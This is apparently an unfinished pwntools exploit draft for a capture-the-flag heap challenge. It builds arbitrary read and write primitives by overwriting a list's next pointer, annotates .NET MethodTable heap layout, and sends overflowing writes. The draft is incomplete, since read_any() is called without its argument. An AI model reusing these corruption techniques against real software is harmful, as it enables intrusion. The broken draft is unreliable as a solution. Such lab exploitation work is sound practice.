from pwn import *



# p = remote('0.0.0.0', 9998)
p = process('./pwn2')

def create(size):
    p.send('\x01' + p8(size))

def write(idx, off, size, content):
    p.send('\x03' + p8(idx) + p8(off) + p8(size) + content)

def read(idx, off, size):
    p.send('\x02' + p8(idx) + p8(off) + p8(size))

def read_any(addr):
    write(1, 0x98, 8, addr - 0x10)
    read(2, 0, 8)
    return p.recv()

def write_any(target, addr):
    write(1, 0x98, 8, target - 0x10)
    write(2, 0, 8, addr)


# def write_any(addr):
   

pause()


# pointer to next FastByteArray object in List located at prev + alignment
#
# Can get arbitrary read/write by overwriting next pointer in List,
# then reading/writing to next index


'''
Heap struct
0x0: *MethodTable for object type
0x8: private variable in object (or size if array of object)
.
.
.
'''

'''
MethodTable struct in heap
+0x0000: 0x0000001801000000
+0x0008: 0x0000000400034488
+0x0010: Pointer to parent type
+0x0018: Pointer to module   ->  entry in JIT page table  ->  starting $RIP in JIT page
+0x0020: 0x00007f38c3f112f0
+0x0028: Pointer to EEClass
+0x0030: 0x00007f38c3d8f608  ->  0x00095e793fa413e8
+0x0038: 0x0000000000000000
+0x0040: 0x00007f38c3f112d0  ->  0x00007f38c3d80090  ->  0x05085e7940998be8
+0x0048: 0x00007f38c3d80090  ->  0x05085e7940998be8
'''

pause()
for _ in range(3):
    create(69)

read_any()
write(0,0xff,0x20,'A'*0x20)
pause()
write(0,0xff,0xff,'A'*0xff)
read(0,0xff,8)


pause()




# from subprocess import Popen, PIPE
# def readall(f, sz):
#     res = bytearray()
#     while len(res) < sz:
#         chunk = f.read(sz - len(res))
#         if not chunk: raise EOFError()
#         res += chunk
#     return bytes(res)
# p = Popen('docker run -i advent2019-1208', shell=True, stdin=PIPE, stdout=PIPE, bufsize=0)
# # allocate 8 bytes
# input("non")
# p.stdin.write(b'\x01\x08')
# # read 4 bytes into buffer
# p.stdin.write(b'\x03\x00\xff\x04ABCD')
# # write 8 bytes from buffer
# p.stdin.write(b'\x02\x00\xff\x08')
# print(repr(readall(p.stdout, 8)))
